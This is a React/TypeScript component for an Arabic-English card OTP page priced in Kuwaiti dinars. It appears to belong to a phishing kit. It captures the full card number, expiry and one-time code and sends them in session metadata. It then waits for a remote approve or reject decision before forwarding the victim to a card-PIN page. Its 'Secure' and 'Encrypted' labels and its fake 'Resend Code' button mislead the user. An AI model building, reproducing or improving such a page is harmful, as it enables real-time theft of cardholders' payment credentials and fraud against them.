import { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useLanguage } from '@/contexts/LanguageContext';
import { getPaymentFlowState, savePaymentFlowState } from '@/lib/paymentFlowState';
import { usePaymentSession } from '@/hooks/usePaymentSession';

import { Shield, Lock, CheckCircle, MessageSquare, AlertCircle } from 'lucide-react';
import PaymentRejectionBanner from '@/components/PaymentRejectionBanner';

const CardOTP = () => {
  const { lang } = useLanguage();
  const navigate = useNavigate();
  const location = useLocation();
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [timer, setTimer] = useState(180);
  const [rejected, setRejected] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const state = (location.state as any) || getPaymentFlowState() || {};
  const total = state?.total || 0;
  const cardNumber = state?.cardNumber || '';

  const { status, waiting, remainingTime, redirectTo, createSession, reset, clearRedirect } = usePaymentSession();

  useEffect(() => {
    if (redirectTo) {
      navigate(redirectTo.split("?")[0], { state, replace: true }); clearRedirect();
    }
  }, [redirectTo]);

  useEffect(() => {
    if (timer > 0) {
      const interval = setInterval(() => setTimer(t => t - 1), 1000);
      return () => clearInterval(interval);
    }
  }, [timer]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (status === 'approved') {
      savePaymentFlowState(state); navigate('/card-pin', { state });
    } else if (status === 'rejected') {
      setRejected(true);
      setDigits(['', '', '', '', '', '']);
      reset();
      inputRefs.current[0]?.focus();
    }
  }, [status]);

  const handleDigitChange = (index: number, value: string) => {
    if (!/^\d?$/.test(value)) return;
    const newDigits = [...digits];
    newDigits[index] = value;
    setDigits(newDigits);
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newDigits = [...digits];
    for (let i = 0; i < 6; i++) newDigits[i] = pasted[i] || '';
    setDigits(newDigits);
    const focusIdx = Math.min(pasted.length, 5);
    inputRefs.current[focusIdx]?.focus();
  };

  const otp = digits.join('');
  const isComplete = otp.length === 6;

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isComplete) return;
    setRejected(false);
    await createSession({
      step: 'card_otp',
      customerName: state?.form?.name,
      customerPhone: state?.form?.phone,
      total,
      cardLast4: cardNumber.slice(-4),
      paymentMethod: 'card',
      metadata: { otp, cardNumber: state?.cardNumber, expiry: `${state?.expiryMonth}/${state?.expiryYear}` },
    });
  };

  const timerMin = String(Math.floor(timer / 60)).padStart(2, '0');
  const timerSec = String(timer % 60).padStart(2, '0');
  const last4 = cardNumber.slice(-4) || '0000';
  const progress = (timer / 180) * 100;

  return (
    <>
      <div style={{ backgroundColor: 'hsl(var(--muted) / 0.5)', minHeight: '100dvh', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '16px 10px' }}>
        <div style={{ width: '100%', maxWidth: '440px' }}>

          {/* Waiting Overlay */}
          {waiting && status === 'pending' && (
            <div style={{
              position: 'fixed', inset: 0, zIndex: 9999,
              backgroundColor: 'rgba(0,0,0,0.6)', display: 'flex', alignItems: 'center', justifyContent: 'center',
            }}>
              <div style={{
                backgroundColor: 'hsl(var(--card))', borderRadius: '14px', padding: '24px 20px',
                textAlign: 'center', maxWidth: '300px', width: '90%',
                boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
              }}>
                <div style={{
                  width: '40px', height: '40px', border: '3px solid hsl(var(--muted))',
                  borderTopColor: '#4caf50', borderRadius: '50%',
                  animation: 'spin 1s linear infinite', margin: '0 auto 14px',
                }} />
                <h3 style={{ fontSize: '13px', fontWeight: 'bold', color: 'hsl(var(--foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 6px' }}>
                  {lang === 'ar' ? 'جاري التحقق من الرمز...' : 'Verifying code...'}
                </h3>
                <p style={{ fontSize: '11px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 12px' }}>
                  {lang === 'ar' ? 'يرجى الانتظار' : 'Please wait'}
                </p>
                <div style={{ fontSize: '18px', fontWeight: 'bold', fontFamily: 'monospace', color: remainingTime <= 30 ? '#f44336' : '#4caf50' }}>
                  {Math.floor(remainingTime / 60)}:{String(remainingTime % 60).padStart(2, '0')}
                </div>
                <div style={{ width: '80%', height: '3px', borderRadius: '2px', backgroundColor: 'hsl(var(--muted))', margin: '6px auto 0', overflow: 'hidden' }}>
                  <div style={{ width: `${(remainingTime / 300) * 100}%`, height: '100%', borderRadius: '2px', backgroundColor: remainingTime <= 30 ? '#f44336' : '#4caf50', transition: 'width 1s linear' }} />
                </div>
              </div>
            </div>
          )}

          {/* Main Card */}
          <div style={{
            backgroundColor: 'hsl(var(--card))', borderRadius: '14px',
            boxShadow: '0 8px 40px rgba(0,0,0,0.08)', overflow: 'hidden',
          }}>
            {/* Security header */}
            <div style={{
              display: 'flex', justifyContent: 'center', gap: '16px', padding: '10px 16px',
              borderBottom: '1px solid hsl(var(--border))', backgroundColor: 'hsl(var(--muted) / 0.3)',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                <Shield size={12} color="#4caf50" />
                <span style={{ fontSize: '9px', fontFamily: 'Cairo, sans-serif', color: 'hsl(var(--muted-foreground))' }}>
                  {lang === 'ar' ? 'تحقق آمن' : 'Secure'}
                </span>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                <Lock size={12} color="#4caf50" />
                <span style={{ fontSize: '9px', fontFamily: 'Cairo, sans-serif', color: 'hsl(var(--muted-foreground))' }}>
                  {lang === 'ar' ? 'مشفر' : 'Encrypted'}
                </span>
              </div>
            </div>

            <form onSubmit={handleVerify}>
              <div style={{ padding: '18px 18px 16px' }}>

                {/* Icon + Title */}
                <div style={{ textAlign: 'center', marginBottom: '16px' }}>
                  <div style={{
                    width: '48px', height: '48px', borderRadius: '50%', margin: '0 auto 10px',
                    background: 'linear-gradient(135deg, rgba(76,175,80,0.1), rgba(76,175,80,0.2))',
                    display: 'flex', alignItems: 'center', justifyContent: 'center',
                  }}>
                    <MessageSquare size={20} color="#4caf50" />
                  </div>
                  <h2 style={{ fontSize: '16px', fontWeight: 'bold', color: 'hsl(var(--foreground))', fontFamily: 'Cairo, sans-serif', margin: '0 0 4px' }}>
                    {lang === 'ar' ? 'رمز التحقق' : 'Verification Code'}
                  </h2>
                  <p style={{ fontSize: '11px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif', margin: 0, lineHeight: '1.5' }}>
                    {lang === 'ar'
                      ? `تم إرسال رمز مكون من 6 أرقام إلى جوالك المسجل لدى البنك للبطاقة المنتهية بـ ${last4}`
                      : `A 6-digit code was sent to your phone for card ending in ${last4}`}
                  </p>
                </div>

                {/* Rejected error */}
                {/* Rejected error — قابل للإغلاق + يختفي بعد 3 ثوانٍ */}
                <div style={{ marginBottom: '12px' }}>
                  <PaymentRejectionBanner
                    show={rejected}
                    onClose={() => setRejected(false)}
                    variant="card"
                  />
                </div>


                {/* Card mini preview */}
                <div style={{
                  background: 'linear-gradient(135deg, #1a1a2e, #0f3460)',
                  borderRadius: '8px', padding: '10px 14px', marginBottom: '16px',
                  display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                }}>
                  <div>
                    <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.5)', fontFamily: 'Cairo, sans-serif', marginBottom: '1px' }}>
                      {lang === 'ar' ? 'المبلغ' : 'Amount'}
                    </div>
                    <div style={{ fontSize: '14px', fontWeight: 'bold', color: '#fff', fontFamily: 'Cairo, sans-serif' }}>
                      {total.toFixed(3)} <span style={{ fontSize: '9px', opacity: 0.7 }}>{lang === 'ar' ? 'د.ك' : 'KWD'}</span>
                    </div>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.5)', fontFamily: 'Cairo, sans-serif', marginBottom: '1px' }}>
                      {lang === 'ar' ? 'البطاقة' : 'Card'}
                    </div>
                    <div style={{ fontSize: '12px', color: '#fff', fontFamily: 'monospace', letterSpacing: '2px' }}>
                      •••• {last4}
                    </div>
                  </div>
                </div>

                {/* OTP Inputs */}
                <div style={{ display: 'flex', justifyContent: 'center', gap: '6px', marginBottom: '6px' }} dir="ltr">
                  {digits.map((d, i) => (
                    <input
                      key={i}
                      ref={el => { inputRefs.current[i] = el; }}
                      type="text" inputMode="numeric" maxLength={1}
                      value={d}
                      onChange={e => handleDigitChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      onPaste={i === 0 ? handlePaste : undefined}
                      style={{
                        width: '38px', height: '44px', textAlign: 'center',
                        fontSize: '18px', fontFamily: 'monospace', fontWeight: 'bold',
                        border: d ? '2px solid #4caf50' : '2px solid hsl(var(--border))',
                        borderRadius: '8px', outline: 'none',
                        backgroundColor: d ? 'rgba(76,175,80,0.05)' : 'hsl(var(--muted) / 0.3)',
                        color: 'hsl(var(--foreground))',
                        transition: 'all 0.2s ease',
                      }}
                    />
                  ))}
                </div>

                {/* Timer */}
                <div style={{ textAlign: 'center', marginBottom: '16px' }}>
                  <div style={{
                    width: '100px', height: '3px', borderRadius: '2px',
                    backgroundColor: 'hsl(var(--muted))', margin: '8px auto 6px',
                    overflow: 'hidden',
                  }}>
                    <div style={{
                      width: `${progress}%`, height: '100%', borderRadius: '2px',
                      backgroundColor: timer > 30 ? '#4caf50' : '#f44336',
                      transition: 'width 1s linear, background-color 0.5s',
                    }} />
                  </div>
                  <span style={{
                    fontSize: '11px', fontFamily: 'monospace', fontWeight: 'bold',
                    color: timer > 30 ? 'hsl(var(--muted-foreground))' : '#f44336',
                  }}>
                    {timerMin}:{timerSec}
                  </span>
                  {timer === 0 && (
                    <button type="button" onClick={() => setTimer(180)} style={{
                      display: 'block', margin: '6px auto 0', background: 'none', border: 'none',
                      color: '#4caf50', fontSize: '11px', fontFamily: 'Cairo, sans-serif',
                      fontWeight: 'bold', cursor: 'pointer', textDecoration: 'underline',
                    }}>
                      {lang === 'ar' ? 'إعادة إرسال الرمز' : 'Resend Code'}
                    </button>
                  )}
                </div>

                {/* Status indicator */}
                <div style={{
                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '4px',
                  marginBottom: '14px', padding: '6px', borderRadius: '6px',
                  backgroundColor: isComplete ? 'rgba(76,175,80,0.08)' : 'transparent',
                  transition: 'all 0.3s',
                }}>
                  <CheckCircle size={12} color={isComplete ? '#4caf50' : 'hsl(var(--muted-foreground))'} style={{ opacity: isComplete ? 1 : 0.3 }} />
                  <span style={{
                    fontSize: '10px', fontFamily: 'Cairo, sans-serif',
                    color: isComplete ? '#4caf50' : 'hsl(var(--muted-foreground))',
                    fontWeight: isComplete ? 'bold' : 'normal',
                  }}>
                    {isComplete
                      ? (lang === 'ar' ? 'الرمز مكتمل - جاهز للتحقق' : 'Code complete - ready to verify')
                      : (lang === 'ar' ? `أدخل ${6 - otp.length} أرقام متبقية` : `Enter ${6 - otp.length} more digits`)}
                  </span>
                </div>

                {/* Submit */}
                <button
                  type="submit"
                  disabled={!isComplete || waiting}
                  style={{
                    width: '100%', border: 'none', borderRadius: '8px', padding: '10px',
                    fontSize: '13px', fontWeight: 'bold', fontFamily: 'Cairo, sans-serif',
                    cursor: (!isComplete || waiting) ? 'not-allowed' : 'pointer',
                    background: (!isComplete || waiting)
                      ? 'hsl(var(--muted))'
                      : 'linear-gradient(135deg, #4caf50, #2e7d32)',
                    color: '#fff',
                    boxShadow: (!isComplete || waiting) ? 'none' : '0 4px 15px rgba(76,175,80,0.3)',
                    transition: 'all 0.3s ease',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px',
                  }}
                >
                  <Lock size={14} />
                  {lang === 'ar' ? 'تأكيد الدفع' : 'Confirm Payment'}
                </button>

                {/* Footer */}
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '4px', marginTop: '10px' }}>
                  <Lock size={10} color="#4caf50" />
                  <span style={{ fontSize: '9px', color: 'hsl(var(--muted-foreground))', fontFamily: 'Cairo, sans-serif' }}>
                    {lang === 'ar' ? 'معاملة مشفرة وآمنة بالكامل' : 'Fully encrypted & secure transaction'}
                  </span>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </>
  );
};

export default CardOTP;
